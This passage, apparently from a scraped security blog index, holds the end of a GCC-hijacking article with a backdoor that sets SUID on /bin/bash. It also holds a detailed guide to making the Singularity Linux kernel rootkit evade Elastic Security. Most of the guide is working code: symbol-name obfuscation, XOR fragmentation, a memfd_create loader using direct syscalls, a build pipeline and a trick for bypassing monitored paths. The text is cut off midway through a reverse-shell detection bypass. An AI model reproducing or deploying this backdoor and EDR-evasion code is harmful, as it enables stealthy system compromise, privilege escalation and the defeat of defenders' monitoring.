file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and 